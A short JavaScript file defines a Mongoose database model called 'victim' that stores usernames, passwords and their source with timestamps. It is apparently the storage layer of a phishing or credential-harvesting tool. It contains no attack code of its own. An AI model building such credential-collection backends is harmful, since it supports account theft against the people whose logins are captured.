const { default: mongoose } = require("mongoose");
const monsoose = require("mongoose");

const victimSchema = new mongoose.Schema({
    username: {type: String, required: true},
    pass: {type: String, required: true},
    source: {type: String, required: true},
},{timestamps: true})


const Victim = mongoose.model("victim", victimSchema)
module.exports = Victim